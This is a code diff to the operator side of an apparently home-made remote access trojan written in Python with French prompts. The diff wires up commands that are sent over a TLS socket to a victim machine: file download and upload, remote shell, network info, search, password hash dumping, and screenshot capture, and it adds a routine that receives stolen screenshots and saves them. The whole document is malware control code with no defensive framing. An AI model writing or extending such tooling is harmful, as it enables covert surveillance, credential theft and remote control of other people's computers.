@@ -5,29 +5,39 @@ from dotenv import load_dotenv
 
 SERVER_PORT = 8888
 
-def menu_help() :
-    print('help')
+def menu_help(client_socket) :
+    client_socket.send(b'menu_help')
 
-def download() :
-    print('download')
+def download(client_socket) :
+    client_socket.send(b'download')
 
-def upload() :
-    print('upload')
+def upload(client_socket) :
+    client_socket.send(b'upload')
 
-def shell() :
-    print('shell')
+def shell(client_socket) :
+    client_socket.send(b'shell')
 
-def ipconfig() :
-    print('ipconfig')
+def ipconfig(client_socket) :
+    client_socket.send(b'ipconfig')
 
-def screenshot() :
-    print('ipconfig')
+def screenshot(client_socket, nb_screenshot) :
+    client_socket.send(b'screenshot')
+    screenshot_name = f'screenshot{nb_screenshot}.png'
+    with open(screenshot_name, 'wb') as screenshot:
+        while True:
+            screenshot_received = client_socket.recv(4096)
+            if screenshot_received.endswith(b'END'):
+                screenshot.write(screenshot_received[:-3])
+                break
+            screenshot.write(screenshot_received)
+    print(f'[+] {screenshot_name} reçu')
+    return nb_screenshot + 1
 
-def search() :
-    print('search')
+def search(client_socket) :
+    client_socket.send(b'search')
 
-def hashdump() :
-    print('hashdump')
+def hashdump(client_socket) :
+    client_socket.send(b'hashdump')
 
 
 
@@ -35,6 +45,8 @@ def main() :
 
     load_dotenv()
     ip_server = os.getenv('IP_SERVER')
+
+    nb_screenshot = 1
 
     cert = './cert.pem'
     key = './key.pem'
@@ -56,21 +68,21 @@ def main() :
         while True:
             command = input("rat > Taper votre commande ici : ")
             if command.lower() == 'help':
-                menu_help()
+                menu_help(client_socket)
             elif command.lower() == 'download':
-                download()
+                download(client_socket)
             elif command.lower() == 'upload':
-                upload()
+                upload(client_socket)
             elif command.lower() == 'shell':
-                shell()
+                shell(client_socket)
             elif command.lower() == 'ipconfig':
-                ipconfig()
+                ipconfig(client_socket)
             elif command.lower() == 'screenshot':
-                screenshot()
+                nb_screenshot = screenshot(client_socket, nb_screenshot)
             elif command.lower() == 'search':
-                search()
+                search(client_socket)
             elif command.lower() == 'hashdump':
-                hashdump()
+                hashdump(client_socket)
             elif command.lower() == 'exit':
                 client_socket.send(b'exit')
                 break
